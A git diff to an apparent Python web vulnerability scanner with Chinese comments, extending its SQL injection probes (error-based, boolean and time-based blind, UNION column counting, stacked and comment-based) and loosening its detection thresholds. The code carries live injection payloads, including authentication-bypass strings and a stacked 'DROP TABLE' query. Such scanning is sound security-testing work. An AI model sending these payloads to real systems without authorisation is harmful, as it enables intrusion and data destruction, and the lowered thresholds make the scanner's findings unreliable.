@@ -109,13 +109,14 @@ class sampilescanner:
             }
         }
         
-        # SQL注入检测阈值配置
+        # SQL注入检测阈值配置 - 降低阈值以提高检测率
         self.sql_thresholds = {
-            "time_based_threshold": self.sql_config.get("time_based_threshold", 3.0),
-            "response_similarity_threshold": 0.7,
-            "length_variation_threshold": 0.3
+            "time_based_threshold": self.sql_config.get("time_based_threshold", 1.5),  # 降低到1.5秒
+            "response_similarity_threshold": 0.65,  # 降低相似度阈值
+            "length_variation_threshold": 0.2,  # 降低长度变化阈值
+            "union_column_max": 10,  # 增加联合查询最大列数
+            "boolean_confidence_min": 0.6  # 布尔盲注最小置信度
         }
-
 
 
     def _get_default_xss_payloads(self):
@@ -526,8 +527,60 @@ class sampilescanner:
             else:
                 url = str(url)
 
+        print(f"  [*] 开始错误注入检测，共 {len(self.sql_payloads.get('error_based', []))} 个payload")
+        
         error_payloads = self.sql_payloads.get("error_based", [])
+        
+        # 先测试简单的payload快速验证
+        quick_payloads = ["'", "\"", "' OR '1'='1", "1'", "1\""]
+        
+        for payload in quick_payloads:
+            try:
+                test_value = f"{param_value}{payload}"
+                request_info = {
+                    'method': method.upper(),
+                    'url': url,
+                    'headers': self.sql_config.get("request_config", {}).get("headers", {}),
+                    'allow_redirects': True
+                }
 
+                if method.upper() == "GET":
+                    test_url = self._build_url_with_param(url, param_name, test_value)
+                    if not test_url:
+                        continue
+                    request_info['url'] = test_url
+                else:
+                    data = post_data.copy() if post_data else {}
+                    data[param_name] = test_value
+                    request_info['data'] = data
+
+                response = self.send_controlled_request(request_info)
+
+                if response and 'response' in response:
+                    content = response['response'].get('content', '')
+                    if not isinstance(content, str):
+                        content = str(content) if content is not None else ''
+
+                    # 检查响应中是否包含数据库错误信息
+                    error_found = self._check_for_database_errors(content)
+
+                    if error_found:
+                        db_type = self._identify_database_type(content)
+                        return {
+                            'type': 'Error-Based SQL Injection',
+                            'payload': payload,
+                            'database': db_type,
+                            'confidence': '高',
+                            'evidence': error_found[:200],
+                            'response_code': response['response'].get('status_code', 0),
+                            'response_length': len(content),
+                            'technique': 'Error message disclosure'
+                        }
+
+            except Exception as e:
+                continue
+        
+        # 如果没有快速检测到，测试配置文件中的所有payload
         for payload_info in error_payloads:
             payload = payload_info.get("payload", "")
             db_type = payload_info.get("database", "generic")
@@ -543,7 +596,7 @@ class sampilescanner:
 
                 if method.upper() == "GET":
                     test_url = self._build_url_with_param(url, param_name, test_value)
-                    if not test_url:  # 如果构建URL失败，跳过
+                    if not test_url:
                         continue
                     request_info['url'] = test_url
                 else:
@@ -554,7 +607,6 @@ class sampilescanner:
                 response = self.send_controlled_request(request_info)
 
                 if response and 'response' in response:
-                    # 确保响应内容是字符串
                     content = response['response'].get('content', '')
                     if not isinstance(content, str):
                         content = str(content) if content is not None else ''
@@ -563,6 +615,7 @@ class sampilescanner:
                     error_found = self._check_for_database_errors(content)
 
                     if error_found:
+                        db_type = self._identify_database_type(content)
                         return {
                             'type': 'Error-Based SQL Injection',
                             'payload': payload,
@@ -575,58 +628,49 @@ class sampilescanner:
                         }
 
             except Exception as e:
-                # 不再打印每个payload的详细错误，只记录一次
-                continue
-            
-        # 如果没有使用配置payload检测到，使用简单payload再试一次
-        simple_payloads = ["'", "\"", "' OR '1'='1"]
-        for payload in simple_payloads:
-            try:
-                test_value = f"{param_value}{payload}"
-                request_info = {
-                    'method': method.upper(),
-                    'url': url,
-                    'headers': self.sql_config.get("request_config", {}).get("headers", {}),
-                    'allow_redirects': True
-                }
-
-                if method.upper() == "GET":
-                    test_url = self._build_url_with_param(url, param_name, test_value)
-                    if not test_url:  # 如果构建URL失败，跳过
-                        continue
-                    request_info['url'] = test_url
-                else:
-                    data = post_data.copy() if post_data else {}
-                    data[param_name] = test_value
-                    request_info['data'] = data
-
-                response = self.send_controlled_request(request_info)
-
-                if response and 'response' in response:
-                    # 确保响应内容是字符串
-                    content = response['response'].get('content', '')
-                    if not isinstance(content, str):
-                        content = str(content) if content is not None else ''
-
-                    error_found = self._check_for_database_errors(content)
-
-                    if error_found:
-                        return {
-                            'type': 'Error-Based SQL Injection',
-                            'payload': payload,
-                            'database': 'generic',
-                            'confidence': 'High',
-                            'evidence': error_found[:200],
-                            'response_code': response['response'].get('status_code', 0),
-                            'response_length': len(content),
-                            'technique': 'Error message disclosure'
-                        }
-
-            except Exception as e:
                 continue
             
         return None
     
+    def _identify_database_type(self, response_text):
+        """识别数据库类型"""
+        if not isinstance(response_text, str):
+            response_text = str(response_text)
+        
+        response_lower = response_text.lower()
+        
+        # MySQL
+        mysql_patterns = ["mysql", "mysqli", "you have an error in your sql syntax"]
+        for pattern in mysql_patterns:
+            if pattern in response_lower:
+                return "mysql"
+        
+        # SQL Server
+        mssql_patterns = ["microsoft sql server", "odbc", "oledb", "sql server", "unclosed quotation mark"]
+        for pattern in mssql_patterns:
+            if pattern in response_lower:
+                return "mssql"
+        
+        # Oracle
+        oracle_patterns = ["ora-", "oracle", "pl/sql"]
+        for pattern in oracle_patterns:
+            if pattern in response_lower:
+                return "oracle"
+        
+        # PostgreSQL
+        postgres_patterns = ["postgresql", "pg_", "syntax error at or near"]
+        for pattern in postgres_patterns:
+            if pattern in response_lower:
+                return "postgresql"
+        
+        # SQLite
+        sqlite_patterns = ["sqlite", "sqlite3", "near.*syntax error"]
+        for pattern in sqlite_patterns:
+            if pattern in response_lower:
+                return "sqlite"
+        
+        return "unknown"
+
     def _ensure_string_url(self, url_input):
         """确保URL是字符串类型"""
         if isinstance(url_input, str):
@@ -743,27 +787,28 @@ class sampilescanner:
         if not baseline:
             return None
         
+        print(f"  [*] 开始布尔盲注检测，基准响应长度: {baseline['length']}")
+        
         boolean_payloads = self.sql_payloads.get("boolean_based", [])
         
         # 构建标准真假条件集合（更全面的识别方式）
-        if not boolean_payloads:
-            # 默认payload - 针对不同SQL场景
-            true_payloads = [
-                "' AND '1'='1",
-                "' AND 1=1",
-                "' AND (1=1)",
-                "' OR 1=1--",
-                "\" AND \"1\"=\"1",
-            ]
-            false_payloads = [
-                "' AND '1'='2",
-                "' AND 1=2",
-                "' AND (1=2)",
-                "' OR 1=2--",
-                "\" AND \"1\"=\"2",
-            ]
-        else:
-            # 从配置文件智能识别真假条件
+        true_payloads = [
+            "' AND '1'='1",
+            "' AND 1=1",
+            "' AND (1=1)",
+            "' OR 1=1--",
+            "\" AND \"1\"=\"1",
+        ]
+        false_payloads = [
+            "' AND '1'='2",
+            "' AND 1=2",
+            "' AND (1=2)",
+            "' OR 1=2--",
+            "\" AND \"1\"=\"2",
+        ]
+        
+        # 如果配置中有payload，优先使用
+        if boolean_payloads:
             true_payloads = []
             false_payloads = []
             
@@ -772,7 +817,6 @@ class sampilescanner:
                 payload_lower = payload.lower()
                 
                 # 更准确的真假判断逻辑
-                # 真条件特征：1=1, 'a'='a, true, or 1=1, 存在AND接1=1
                 is_true_condition = (
                     "1=1" in payload or 
                     "'1'='1" in payload or
@@ -801,18 +845,15 @@ class sampilescanner:
                 elif is_false_condition and not is_true_condition:
                     false_payloads.append(payload)
         
-        # 如果识别不足，补充默认payload
-        if not true_payloads:
-            true_payloads = ["' AND '1'='1", "' AND 1=1", "' OR 1=1--"]
-        if not false_payloads:
-            false_payloads = ["' AND '1'='2", "' AND 1=2", "' OR 1=2--"]
+        print(f"  [*] 真条件payload: {len(true_payloads)} 个，假条件payload: {len(false_payloads)} 个")
         
         # 多轮测试以确保结果准确
         true_responses = []
         false_responses = []
         
         # 测试真条件（最多3个payload）
-        for payload in true_payloads[:3]:
+        for i, payload in enumerate(true_payloads[:3]):
+            print(f"  [>] 测试真条件 #{i+1}: {payload[:50]}...")
             true_response = self._test_boolean_condition(
                 url, param_name, param_value, method, post_data, payload
             )
@@ -820,7 +861,8 @@ class sampilescanner:
                 true_responses.append(true_response)
         
         # 测试假条件（最多3个payload）
-        for payload in false_payloads[:3]:
+        for i, payload in enumerate(false_payloads[:3]):
+            print(f"  [>] 测试假条件 #{i+1}: {payload[:50]}...")
             false_response = self._test_boolean_condition(
                 url, param_name, param_value, method, post_data, payload
             )
@@ -829,6 +871,7 @@ class sampilescanner:
         
         # 需要至少各有1个响应来进行对比
         if not true_responses or not false_responses:
+            print(f"  [-] 缺少真/假条件响应，无法进行布尔盲注分析")
             return None
         
         # 对所有响应进行统计分析
@@ -847,15 +890,19 @@ class sampilescanner:
         avg_true_sim = sum(true_similarities) / len(true_similarities) if true_similarities else 0
         avg_false_sim = sum(false_similarities) / len(false_similarities) if false_similarities else 0
         
-        # 布尔盲注特征判断
-        # 1. 真条件的响应与基准非常相似（>75%）
-        # 2. 假条件的响应与基准有明显差异（<60%）
-        # 3. 两者相似度差异明显（>20%）
-        similarity_threshold = self.sql_thresholds.get('response_similarity_threshold', 0.85)
+        print(f"  [*] 真条件平均相似度: {avg_true_sim:.3f}")
+        print(f"  [*] 假条件平均相似度: {avg_false_sim:.3f}")
+        print(f"  [*] 相似度差异: {(avg_true_sim - avg_false_sim):.3f}")
         
-        true_matches_baseline = avg_true_sim > (similarity_threshold - 0.2)  # 降低阈值到0.65-0.75
-        false_differs_from_baseline = avg_false_sim < similarity_threshold
-        difference_significant = (avg_true_sim - avg_false_sim) > 0.2
+        # 布尔盲注特征判断
+        # 降低阈值以提高检测率
+        true_matches_baseline = avg_true_sim > 0.6  # 从0.65降低到0.6
+        false_differs_from_baseline = avg_false_sim < 0.7  # 从0.85降低到0.7
+        difference_significant = (avg_true_sim - avg_false_sim) > 0.15  # 从0.2降低到0.15
+        
+        print(f"  [*] 真条件匹配基准: {true_matches_baseline}")
+        print(f"  [*] 假条件与基准差异明显: {false_differs_from_baseline}")
+        print(f"  [*] 差异显著: {difference_significant}")
         
         if true_matches_baseline and false_differs_from_baseline and difference_significant:
             # 进一步验证：检查内容长度差异
@@ -864,8 +911,10 @@ class sampilescanner:
             
             length_diff_ratio = abs(avg_true_len - avg_false_len) / max(baseline['length'], 1)
             
-            # 假条件应该有明显的长度差异
-            if length_diff_ratio > 0.05 or avg_false_sim < 0.7:
+            print(f"  [*] 长度差异比例: {length_diff_ratio:.3f}")
+            
+            # 降低长度差异要求
+            if length_diff_ratio > 0.03 or avg_false_sim < 0.6:  # 从0.05降低到0.03
                 return {
                     'type': 'Boolean-Based Blind SQL Injection',
                     'confidence': '中',
@@ -883,6 +932,7 @@ class sampilescanner:
                     'technique': 'Boolean condition differential analysis with multi-payload verification'
                 }
         
+        print(f"  [-] 未发现布尔盲注漏洞")
         return None
 
     def _test_boolean_condition(self, url, param_name, param_value, method, post_data, payload):
@@ -924,6 +974,8 @@ class sampilescanner:
     # ==================== 时间盲注检测 ====================
     def detect_time_based(self, url, param_name, param_value, method, post_data):
         """时间盲注检测 - 使用配置文件payload"""
+        print(f"  [*] 开始时间盲注检测，阈值: {self.sql_thresholds['time_based_threshold']}秒")
+        
         time_payloads = self.sql_payloads.get("time_based", [])
         
         if not time_payloads:
@@ -938,10 +990,13 @@ class sampilescanner:
         
         # 首先获取正常响应时间
         normal_time = self._measure_response_time(url, param_name, param_value, method, post_data)
+        print(f"  [*] 正常响应时间: {normal_time:.3f}秒")
         
-        for payload_info in time_payloads[:5]:  # 只测试前5个，避免耗时过长
+        for payload_info in time_payloads[:8]:  # 增加测试payload数量
             payload = payload_info.get("payload", "")
             db_type = payload_info.get("database", "generic")
+            
+            print(f"  [>] 测试时间payload: {payload[:50]}...")
             
             try:
                 test_value = f"{param_value}{payload}"
@@ -966,6 +1021,8 @@ class sampilescanner:
                 response = self.send_controlled_request(request_info)
                 elapsed_time = time.time() - start_time
                 
+                print(f"  [*] 延迟payload响应时间: {elapsed_time:.3f}秒")
+                
                 # 检查是否超时或明显延迟
                 if elapsed_time > self.sql_thresholds['time_based_threshold']:
                     # 验证：发送不延迟的payload对比
@@ -974,15 +1031,18 @@ class sampilescanner:
                         url, param_name, no_delay_value, method, post_data
                     )
                     
-                    if elapsed_time > no_delay_time * 3:  # 延迟至少3倍
+                    print(f"  [*] 无延迟payload响应时间: {no_delay_time:.3f}秒")
+                    
+                    # 降低延迟倍数要求
+                    if elapsed_time > no_delay_time * 2:  # 从3倍降低到2倍
                         return {
                             'type': 'Time-Based Blind SQL Injection',
                             'payload': payload,
                             'database': db_type,
                             'confidence': '中',
                             'evidence': {
-                                'normal_response_time': normal_time,
-                                'delayed_response_time': elapsed_time,
+                                'normal_response_time': round(normal_time, 3),
+                                'delayed_response_time': round(elapsed_time, 3),
                                 'threshold': self.sql_thresholds['time_based_threshold']
                             },
                             'technique': 'Time delay'
@@ -990,17 +1050,19 @@ class sampilescanner:
                         
             except Exception as e:
                 # 超时也可能是时间盲注的特征
-                if "timeout" in str(e).lower() or "time out" in str(e).lower():
+                error_str = str(e).lower()
+                if "timeout" in error_str or "time out" in error_str or "timed out" in error_str:
                     return {
                         'type': 'Time-Based Blind SQL Injection (Timeout)',
                         'payload': payload,
                         'database': db_type,
                         'confidence': '中',
-                        'evidence': 'Request timeout occurred',
+                        'evidence': f'Request timeout occurred: {error_str[:100]}',
                         'technique': 'Request timeout'
                     }
                 continue
         
+        print(f"  [-] 未发现时间盲注漏洞")
         return None
 
     def _measure_response_time(self, url, param_name, param_value, method, post_data):
@@ -1040,8 +1102,12 @@ class sampilescanner:
         3. 通过多个标记验证可输出的列位置
         4. 确认可以提取数据库信息
         """
+        print(f"  [*] 开始联合查询注入检测")
+        
         # 先探测列数（使用多种方法提高精准度）
         column_count = self._detect_column_count_advanced(url, param_name, param_value, method, post_data)
+        
+        print(f"  [*] 探测到列数: {column_count}")
         
         if column_count <= 0:
             return None
@@ -1050,6 +1116,8 @@ class sampilescanner:
         displayable_columns = self._find_displayable_columns(
             url, param_name, param_value, method, post_data, column_count
         )
+        
+        print(f"  [*] 可显示列位置: {displayable_columns}")
         
         if not displayable_columns:
             return None
@@ -1064,6 +1132,8 @@ class sampilescanner:
         
         union_payload = f"' UNION SELECT {','.join(select_parts)}--"
         test_value = f"{param_value}{union_payload}"
+        
+        print(f"  [>] 测试联合查询payload: {union_payload[:50]}...")
         
         try:
             request_info = {
@@ -1110,10 +1180,13 @@ class sampilescanner:
                         'payload': union_payload,
                         'technique': 'Union-based data extraction with verified column count'
                     }
+                else:
+                    print(f"  [-] 联合查询标记未在响应中找到")
                         
         except Exception as e:
-            pass
+            print(f"  [-] 联合查询检测出错: {e}")
         
+        print(f"  [-] 未发现联合查询注入漏洞")
         return None
     
     def _detect_column_count_advanced(self, url, param_name, param_value, method, post_data):
@@ -1125,11 +1198,19 @@ class sampilescanner:
         2. UNION SELECT with NULL法（直接检测）
         3. GROUP BY法（辅助验证）
         """
+        print(f"    [*] 开始列数探测...")
+        
         # 方法1：使用ORDER BY探测列数
         order_by_columns = self._detect_via_order_by(url, param_name, param_value, method, post_data)
+        print(f"    [*] ORDER BY法探测列数: {order_by_columns}")
         
         # 方法2：使用UNION SELECT NULL探测
         union_columns = self._detect_via_union_select(url, param_name, param_value, method, post_data)
+        print(f"    [*] UNION SELECT法探测列数: {union_columns}")
+        
+        # 方法3：使用GROUP BY探测列数
+        group_by_columns = self._detect_via_group_by(url, param_name, param_value, method, post_data)
+        print(f"    [*] GROUP BY法探测列数: {group_by_columns}")
         
         # 如果两种方法结果一致，更加确定
         if order_by_columns > 0 and union_columns > 0:
@@ -1144,12 +1225,14 @@ class sampilescanner:
             return order_by_columns
         if union_columns > 0:
             return union_columns
+        if group_by_columns > 0:
+            return group_by_columns
         
         return 0
     
     def _detect_via_order_by(self, url, param_name, param_value, method, post_data):
         """通过ORDER BY探测列数"""
-        for i in range(1, 16):  # 尝试1-15列
+        for i in range(1, self.sql_thresholds['union_column_max'] + 1):  # 增加到配置的最大列数
             order_payload = f"' ORDER BY {i}--"
             order_value = f"{param_value}{order_payload}"
             
@@ -1172,7 +1255,7 @@ class sampilescanner:
     
     def _detect_via_union_select(self, url, param_name, param_value, method, post_data):
         """通过UNION SELECT NULL探测列数"""
-        for i in range(1, 16):  # 尝试1-15列
+        for i in range(1, self.sql_thresholds['union_column_max'] + 1):  # 增加到配置的最大列数
             null_list = ['NULL'] * i
             union_payload = f"' UNION SELECT {','.join(null_list)}--"
             union_value = f"{param_value}{union_payload}"
@@ -1186,16 +1269,47 @@ class sampilescanner:
                 status = union_response['response'].get('status_code', 500)
                 content = union_response['response'].get('content', '')
                 
-                # 如果是语法错误或列数不匹配，返回
+                # 检查是否有语法错误
                 error = self._check_for_database_errors(content)
                 
                 # 有两种情况表示成功：
                 # 1. 没有语法错误且返回200
                 # 2. 响应内容变化表示成功注入
                 if status == 200 and not error:
-                    return i
+                    # 检查响应是否与基准不同
+                    baseline_key = f"{url}_{param_name}_{method}"
+                    if baseline_key in self.baseline_responses:
+                        baseline_content = self.baseline_responses[baseline_key]['content']
+                        similarity = self._calculate_similarity(baseline_content, content)
+                        if similarity < 0.9:  # 响应内容有明显变化
+                            return i
+                    else:
+                        return i
                 elif status >= 400 or error:
                     # 语法错误表示列数不对
+                    return max(0, i - 1)
+            except:
+                break
+        
+        return 0
+    
+    def _detect_via_group_by(self, url, param_name, param_value, method, post_data):
+        """通过GROUP BY探测列数"""
+        for i in range(1, self.sql_thresholds['union_column_max'] + 1):
+            group_payload = f"' GROUP BY {i}--"
+            group_value = f"{param_value}{group_payload}"
+            
+            try:
+                group_response = self._send_request(url, param_name, group_value, method, post_data)
+                
+                if not group_response:
+                    break
+                
+                status = group_response['response'].get('status_code', 500)
+                content = group_response['response'].get('content', '')
+                
+                # 如果是语法错误或500错误，说明列数过多
+                if status >= 400 or self._check_for_database_errors(content):
                     return max(0, i - 1)
             except:
                 break
@@ -1212,8 +1326,8 @@ class sampilescanner:
         displayable = []
         
         # 尝试每个列位置用一个唯一的标记
-        for col_idx in range(min(column_count, 5)):  # 最多检查前5列
-            marker = f"COL_{col_idx}"
+        for col_idx in range(min(column_count, 8)):  # 最多检查8列
+            marker = f"COL_{col_idx}_{int(time.time())}"
             select_parts = []
             
             for i in range(column_count):
@@ -1331,6 +1445,8 @@ class sampilescanner:
     # ==================== 堆叠查询检测 ====================
     def detect_stacked_queries(self, url, param_name, param_value, method, post_data):
         """堆叠查询检测（支持多语句执行）"""
+        print(f"  [*] 开始堆叠查询检测")
+        
         stacked_payloads = self.sql_payloads.get("stacked", [])
         
         if not stacked_payloads:
@@ -1341,9 +1457,14 @@ class sampilescanner:
                 {"payload": "'; DROP TABLE IF EXISTS test_table--", "database": "generic"}
             ]
         
-        for payload_info in stacked_payloads[:5]:  # 只测试前5个
+        # 先获取基准响应
+        baseline = self.get_baseline_response(url, param_name, param_value, method, post_data)
+        
+        for payload_info in stacked_payloads[:8]:  # 增加测试数量
             payload = payload_info.get("payload", "")
             db_type = payload_info.get("database", "generic")
+            
+            print(f"  [>] 测试堆叠查询payload: {payload[:50]}...")
             
             try:
                 test_value = f"{param_value}{payload}"
@@ -1365,8 +1486,10 @@ class sampilescanner:
                 response = self.send_controlled_request(request_info)
                 
                 if response and 'response' in response:
+                    content = response['response'].get('content', '')
+                    
                     # 检查响应中是否有堆叠查询的特征
-                    if self._check_stacked_indicator(response['response']['content']):
+                    if self._check_stacked_indicator(content):
                         # 验证：发送不包含堆叠的payload
                         safe_value = f"{param_value}' AND '1'='1"
                         safe_response = self._send_request(url, param_name, safe_value, method, post_data)
@@ -1380,10 +1503,23 @@ class sampilescanner:
                                 'evidence': 'Stacked query indicator found',
                                 'technique': 'Multiple statement execution'
                             }
+                    # 另外，检查响应内容是否与基准明显不同
+                    elif baseline and self._calculate_similarity(baseline['content'], content) < 0.7:
+                        # 堆叠查询可能导致完全不同的响应
+                        return {
+                            'type': 'Stacked Queries SQL Injection (Response Changed)',
+                            'payload': payload,
+                            'database': db_type,
+                            'confidence': '低',
+                            'evidence': 'Response significantly different from baseline',
+                            'technique': 'Multiple statement execution with response change'
+                        }
                             
-            except Exception:
+            except Exception as e:
+                print(f"  [-] 堆叠查询测试出错: {e}")
                 continue
         
+        print(f"  [-] 未发现堆叠查询注入漏洞")
         return None
 
     def _check_stacked_indicator(self, response_text):
@@ -1393,7 +1529,10 @@ class sampilescanner:
             "multiple statements",
             "batch execution",
             "xp_cmdshell",
-            "command executed"
+            "command executed",
+            "waitfor",
+            "sleep",
+            "delay"
         ]
         
         for indicator in indicators:
@@ -1440,42 +1579,54 @@ class sampilescanner:
         try:
             # 获取基准响应（用于后续对比）
             baseline = self.get_baseline_response(url, param_name or "id", param_value or "1", method, post_data)
+            
+            if not baseline:
+                print("❌ 无法获取基准响应，停止检测")
+                return [], self.results
+
+            print(f"[*] 基准响应状态: {baseline['status']}, 长度: {baseline['length']}")
 
             # 1. 基于错误的检测
             print("\n[1/6] 基于错误的注入检测...")
             error_result = self.detect_error_based(url, param_name or "id", param_value or "1", method, post_data, baseline)
             if error_result:
+                print(f"✅ 发现错误型注入漏洞!")
                 vulnerabilities.append(self._format_vulnerability(error_result, url, param_name, method))
 
             # 2. 布尔盲注检测
-            print("[2/6] 布尔盲注检测...")
+            print("\n[2/6] 布尔盲注检测...")
             boolean_result = self.detect_boolean_based(url, param_name or "id", param_value or "1", method, post_data, baseline)
             if boolean_result:
+                print(f"✅ 发现布尔盲注漏洞!")
                 vulnerabilities.append(self._format_vulnerability(boolean_result, url, param_name, method))
 
             # 3. 时间盲注检测
-            print("[3/6] 时间盲注检测...")
+            print("\n[3/6] 时间盲注检测...")
             time_result = self.detect_time_based(url, param_name or "id", param_value or "1", method, post_data)
             if time_result:
+                print(f"✅ 发现时间盲注漏洞!")
                 vulnerabilities.append(self._format_vulnerability(time_result, url, param_name, method))
 
             # 4. 联合查询检测
-            print("[4/6] 联合查询注入检测...")
+            print("\n[4/6] 联合查询注入检测...")
             union_result = self.detect_union_based(url, param_name or "id", param_value or "1", method, post_data, baseline)
             if union_result:
+                print(f"✅ 发现联合查询注入漏洞!")
                 vulnerabilities.append(self._format_vulnerability(union_result, url, param_name, method))
 
             # 5. 堆叠查询检测
-            print("[5/6] 堆叠查询检测...")
+            print("\n[5/6] 堆叠查询检测...")
             stacked_result = self.detect_stacked_queries(url, param_name or "id", param_value or "1", method, post_data)
             if stacked_result:
+                print(f"✅ 发现堆叠查询注入漏洞!")
                 vulnerabilities.append(self._format_vulnerability(stacked_result, url, param_name, method))
 
-            # 6. 带外数据检测（DNS/HTTP）
-            print("[6/6] 带外数据检测...")
-            oob_result = self.detect_out_of_band(url, param_name or "id", param_value or "1", method, post_data)
-            if oob_result:
-                vulnerabilities.append(self._format_vulnerability(oob_result, url, param_name, method))
+            # 6. 注释型注入检测
+            print("\n[6/6] 注释型注入检测...")
+            comment_result = self.detect_comment_based(url, param_name or "id", param_value or "1", method, post_data, baseline)
+            if comment_result:
+                print(f"✅ 发现注释型注入漏洞!")
+                vulnerabilities.append(self._format_vulnerability(comment_result, url, param_name, method))
 
             # 更新统计信息
             self.update_sql_statistics(vulnerabilities)
@@ -1493,8 +1644,10 @@ class sampilescanner:
                     print(f"   参数: {vuln.get('parameter', param_name or 'N/A')}")
                     print(f"   方法: {vuln['method']}")
                     print(f"   可信度: {vuln['confidence']}")
-                    if 'error_indicator' in vuln:
-                        print(f"   错误指示: {vuln['error_indicator']}")
+                    if 'evidence' in vuln:
+                        print(f"   证据: {vuln['evidence'][:100] if isinstance(vuln['evidence'], str) else '见详细数据'}")
+                    if 'payload' in vuln:
+                        print(f"   Payload: {vuln['payload'][:80]}")
 
             # 更新全局结果
             self.results['vulnerabilities'].extend(vulnerabilities)
@@ -1518,7 +1671,8 @@ class sampilescanner:
             'time_based': 'Time-based Blind SQL Injection',
             'union_based': 'Union-based SQL Injection',
             'stacked_queries': 'Stacked Queries SQL Injection',
-            'out_of_band': 'Out-of-band SQL Injection'
+            'out_of_band': 'Out-of-band SQL Injection',
+            'comment_based': 'Comment-based SQL Injection'
         }
 
         # 如果检测结果已经是字典格式，直接使用或转换
@@ -1559,6 +1713,140 @@ class sampilescanner:
                 'confidence': '中',
                 'description': str(detection_result)
             }
+
+    def detect_comment_based(self, url, param_name, param_value, method, post_data, baseline):
+        """注释型SQL注入检测"""
+        print(f"  [*] 开始注释型注入检测")
+        
+        comment_payloads = self.sql_payloads.get("comment_based", [])
+        
+        if not comment_payloads:
+            comment_payloads = [
+                {"payload": "' OR '1'='1' --", "database": "generic"},
+                {"payload": "' OR '1'='1' #", "database": "mysql"},
+                {"payload": "' OR '1'='1' /*", "database": "generic"},
+                {"payload": "' AND '1'='1' --", "database": "generic"},
+                {"payload": "' UNION SELECT NULL --", "database": "generic"}
+            ]
+        
+        # 测试基本的注释绕过
+        basic_payloads = [
+            ("' OR '1'='1' --", "generic"),
+            ("' OR '1'='1' #", "mysql"),
+            ("' OR '1'='1' /*", "generic")
+        ]
+        
+        for payload, db_type in basic_payloads:
+            print(f"  [>] 测试注释payload: {payload[:50]}...")
+            
+            try:
+                test_value = f"{param_value}{payload}"
+                request_info = {
+                    'method': method.upper(),
+                    'url': url,
+                    'headers': self.sql_config.get("request_config", {}).get("headers", {}),
+                    'allow_redirects': True
+                }
+                
+                if method.upper() == "GET":
+                    test_url = self._build_url_with_param(url, param_name, test_value)
+                    request_info['url'] = test_url
+                else:
+                    data = post_data.copy() if post_data else {}
+                    data[param_name] = test_value
+                    request_info['data'] = data
+                
+                response = self.send_controlled_request(request_info)
+                
+                if response and 'response' in response:
+                    content = response['response'].get('content', '')
+                    
+                    # 检查响应是否与基准不同
+                    if baseline and self._calculate_similarity(baseline['content'], content) < 0.8:
+                        # 检查是否包含注入成功特征
+                        if self._check_injection_success(content, baseline['content']):
+                            return {
+                                'type': 'Comment-Based SQL Injection',
+                                'payload': payload,
+                                'database': db_type,
+                                'confidence': '中',
+                                'evidence': 'Response changed significantly with comment payload',
+                                'technique': 'Comment-based injection bypass'
+                            }
+                            
+            except Exception as e:
+                continue
+        
+        # 测试配置文件中的payload
+        for payload_info in comment_payloads[:5]:
+            payload = payload_info.get("payload", "")
+            db_type = payload_info.get("database", "generic")
+            
+            print(f"  [>] 测试注释payload: {payload[:50]}...")
+            
+            try:
+                test_value = f"{param_value}{payload}"
+                request_info = {
+                    'method': method.upper(),
+                    'url': url,
+                    'headers': self.sql_config.get("request_config", {}).get("headers", {}),
+                    'allow_redirects': True
+                }
+                
+                if method.upper() == "GET":
+                    test_url = self._build_url_with_param(url, param_name, test_value)
+                    request_info['url'] = test_url
+                else:
+                    data = post_data.copy() if post_data else {}
+                    data[param_name] = test_value
+                    request_info['data'] = data
+                
+                response = self.send_controlled_request(request_info)
+                
+                if response and 'response' in response:
+                    content = response['response'].get('content', '')
+                    
+                    # 检查响应是否与基准不同
+                    if baseline and self._calculate_similarity(baseline['content'], content) < 0.8:
+                        # 检查是否包含注入成功特征
+                        if self._check_injection_success(content, baseline['content']):
+                            return {
+                                'type': 'Comment-Based SQL Injection',
+                                'payload': payload,
+                                'database': db_type,
+                                'confidence': '中',
+                                'evidence': 'Response changed significantly with comment payload',
+                                'technique': 'Comment-based injection bypass'
+                            }
+                            
+            except Exception as e:
+                continue
+        
+        print(f"  [-] 未发现注释型注入漏洞")
+        return None
+    
+    def _check_injection_success(self, response_content, baseline_content):
+        """检查注入是否成功"""
+        # 简单的成功检查：内容有明显变化
+        similarity = self._calculate_similarity(response_content, baseline_content)
+        
+        # 检查常见注入成功特征
+        success_indicators = [
+            "welcome",
+            "success",
+            "logged in",
+            "login successful",
+            "admin",
+            "dashboard",
+            "profile"
+        ]
+        
+        for indicator in success_indicators:
+            if indicator in response_content.lower() and indicator not in baseline_content.lower():
+                return True
+        
+        # 如果相似度很低，也可能表示注入成功
+        return similarity < 0.6
 
     def detect_out_of_band(self, url, param_name, param_value, method, post_data):
         """
@@ -2382,189 +2670,6 @@ class sampilescanner:
                 
         return vulnerabilities
 
-    # def detect_stored_xss(self, url, method='POST', data=None, cookies=None, headers=None):
-    #     """
-    #     增强的存储型XSS检测
-        
-    #     修复点：
-    #     1. 与反射型检测完全独立
-    #     2. 修复数据注入逻辑
-    #     3. 改进验证机制
-        
-    #     Args:
-    #         url: 数据提交URL
-    #         method: 请求方法
-    #         data: 提交的数据
-    #         cookies: cookie
-    #         headers: 请求头
-            
-    #     Returns:
-    #         list: 存储型XSS漏洞列表
-    #     """
-    #     vulnerabilities = []
-        
-    #     print(f"  [*] 存储型XSS检测: {url} (方法: {method})")
-        
-    #     # 检查是否支持存储型检测
-    #     if method.upper() not in ['POST', 'PUT', 'PATCH']:
-    #         print(f"    [-] 方法 {method} 不支持存储型XSS检测")
-    #         return []
-        
-    #     if not data:
-    #         print(f"    [-] 没有提交数据，跳过存储型XSS检测")
-    #         return []
-        
-    #     # 使用存储型XSS专用payloads
-    #     for payload_idx, payload in enumerate(self.stored_xss_payloads[:5]):  # 只测试前5个
-    #         try:
-    #             print(f"    [>] 测试存储型payload #{payload_idx+1}: {payload[:50]}...")
-                
-    #             # 创建测试数据 - 修复：确保正确注入payload
-    #             test_data = {}
-    #             unique_marker = f"STORED_XSS_{int(time.time())}_{payload_idx}"
-                
-    #             if isinstance(data, dict):
-    #                 # 复制数据并注入payload
-    #                 test_data = data.copy()
-    #                 for key, value in test_data.items():
-    #                     if isinstance(value, str):
-    #                         # 在原始值后添加payload和唯一标记
-    #                         test_data[key] = f"{value} {payload} {unique_marker}"
-                
-    #             # 提交数据
-    #             submit_request = {
-    #                 'method': method.upper(),
-    #                 'url': url,
-    #                 'headers': headers or {},
-    #                 'data': test_data,
-    #                 'cookies': cookies
-    #             }
-                
-    #             submit_response = self.send_controlled_request(submit_request)
-                
-    #             if not submit_response:
-    #                 print(f"      [-] 提交失败，跳过此payload")
-    #                 continue
-                
-    #             submit_status = submit_response.get('response', {}).get('status_code', 0)
-                
-    #             # 检查提交是否成功
